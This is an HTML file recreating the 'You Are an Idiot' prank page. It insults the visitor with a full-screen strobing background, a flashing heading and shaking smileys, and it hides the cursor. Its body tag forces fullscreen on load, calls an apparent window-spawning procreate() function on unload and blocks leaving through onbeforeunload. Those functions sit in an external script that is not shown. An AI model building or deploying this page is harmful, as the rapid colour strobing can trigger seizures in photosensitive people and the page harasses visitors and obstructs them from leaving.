<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>you are an idiot</title>
<script src="you.js"></script>
<style>
* { margin: 0; padding: 0; }
body { 
    overflow: hidden; 
    background: #ffffff;
    width: 100vw;
    height: 100vh;
    cursor: none;
}
#main {
    width: 100vw; height: 100vh;
    display: flex; flex-direction: column;
    align-items: center; justify-content: center;
    text-align: center;
    animation: strobe 0.15s infinite;
    user-select: none;
}
@keyframes strobe {
    0%   { background: #ff0000; }
    12%  { background: #00ff00; }
    25%  { background: #0000ff; }
    37%  { background: #ffff00; }
    50%  { background: #ff00ff; }
    62%  { background: #00ffff; }
    75%  { background: #ff6600; }
    87%  { background: #9900ff; }
    100% { background: #ff0000; }
}
h1 {
    font-size: 8vw;
    font-family: Arial, sans-serif;
    font-weight: bold;
    color: #000;
    text-shadow: 3px 3px 0 #fff, -3px -3px 0 #fff, 3px -3px 0 #fff, -3px 3px 0 #fff;
    animation: flash 0.3s infinite;
}
@keyframes flash {
    0%, 100% { opacity: 1; }
    50% { opacity: 0; }
}
.smiley {
    font-size: 12vw;
    animation: shake 0.1s infinite;
}
@keyframes shake {
    0% { transform: translate(0, 0) rotate(0deg); }
    25% { transform: translate(5px, 5px) rotate(5deg); }
    50% { transform: translate(-5px, -5px) rotate(-5deg); }
    75% { transform: translate(5px, -5px) rotate(3deg); }
    100% { transform: translate(0, 0) rotate(0deg); }
}
</style>
</head>
<body onload="initFullscreen()" onunload="procreate()" onbeforeunload="return false">

<div id="main">
    <div class="smiley">😊</div>
    <h1>YOU ARE AN IDIOT</h1>
    <div class="smiley">😊</div>
</div>

</body>
</html>
